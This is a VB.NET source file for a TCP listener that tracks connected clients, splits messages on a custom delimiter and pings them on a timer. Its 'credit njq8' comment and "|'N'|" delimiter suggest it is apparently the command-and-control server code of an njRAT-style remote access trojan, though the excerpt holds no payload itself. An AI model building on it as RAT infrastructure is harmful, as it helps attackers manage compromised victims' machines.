Public Class Listner
    'credit njq8
    Public S As Net.Sockets.TcpListener
    Public KEY As String = "|'N'|"
    Public Event Data(ByVal u As USER, ByVal b As Byte())
    Public Event Disconnected(ByVal u As USER)
    Public Event Connected(ByVal u As USER)
    Public Event ms(ByVal u As USER, ByVal ms As Integer)
    Sub New(ByVal port As Integer)
        S = New Net.Sockets.TcpListener(port)
        S.Start()
        S.Server.ReceiveTimeout = -1
        S.Server.SendTimeout = -1
        S.Server.SendBufferSize = 1024 * 1024
        S.Server.ReceiveBufferSize = 1024 * 1024
        Dim t As New Threading.Thread(AddressOf pnd)
        t.Start()
    End Sub
    Sub pnd()
        While True
            Dim x = S.AcceptSocket
            Dim u As New USER(x, Me)
            SyncLock Online
                Online.Add(u, u.IP)
                u.C.BeginReceive(u.B, 0, u.B.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf RCV), u)
                RaiseEvent Connected(u)
            End SyncLock
        End While
    End Sub
    Public Online As New Collection
    Sub RCV(ByVal ar As IAsyncResult)
        Dim u As USER = ar.AsyncState
        If u.IsConnected = False Then GoTo disconnect
        Try
            Dim i = u.C.EndReceive(ar)
            If i > 0 Then
                u.MEM.Write(u.B, 0, i)
re:
                Dim s As String = BS(u.MEM.ToArray)
                If s.Contains(KEY) Then
                    Dim A As Array = fx(u.MEM.ToArray, KEY)
                    RaiseEvent Data(u, A(0))
                    u.MEM.Dispose()
                    u.MEM = New IO.MemoryStream
                    u.MEM.Write(A(1), 0, A(1).length)
                    GoTo re
                End If
            Else
                GoTo disconnect
            End If
            u.C.BeginReceive(u.B, 0, u.B.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf RCV), u)
            Exit Sub
        Catch ex As Exception
        End Try
disconnect:
        u.IsConnected = False
        SyncLock Online
            u.Disconnect()
            Online.Remove(u.IP)
            RaiseEvent Disconnected(u)
        End SyncLock
    End Sub
    Public Function Send(ByVal u As USER, ByVal s As String) As Boolean
        Return Send(u, SB(s))
    End Function
    Public Function Send(ByVal u As USER, ByVal b As Byte()) As Boolean
        Try
            SyncLock u.C
                u.C.Send(b, 0, b.Length, Net.Sockets.SocketFlags.None)
                u.C.Send(SB(KEY), 0, KEY.Length, Net.Sockets.SocketFlags.None)
                Return True
            End SyncLock
        Catch ex As Exception
            u.IsConnected = False
            Return False
        End Try
    End Function
End Class
Public Class USER
    Public WithEvents Timer As Timer
    Public Listner As Listner
    Public IsConnected As Boolean = True
    Public L As ListViewItem = Nothing
    Public C As Net.Sockets.Socket
    Public IP As String = ""
    Public B(1024) As Byte
    Public MEM As New IO.MemoryStream
    Public IsPinged As Boolean = False
    Public MS As Integer = 2500
    Sub New(ByVal c As Net.Sockets.Socket, ByVal listner As Listner)
        Me.C = c
        Me.Listner = listner
        IP = c.RemoteEndPoint.ToString
        My.Application.OpenForms(0).Invoke(New _INV(AddressOf inv))
    End Sub
    Delegate Sub _INV()
    Sub inv()
        Timer = New Timer
        Timer.Interval = 1
        Timer.Enabled = True
    End Sub
    Sub TICK() Handles Timer.Tick
        MS += 1
        If IsConnected = False Then
            Timer.Dispose()
        End If
        If MS > 2500 Then
            If IsPinged = False Then
                Listner.Send(Me, "ping")
                MS = 0
            Else
                Disconnect()
                Timer.Dispose()
            End If
        End If
    End Sub
    Public Sub Disconnect()
        IsConnected = False
        Try
            C.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            C.Close()
        Catch ex As Exception
        End Try
    End Sub
End Class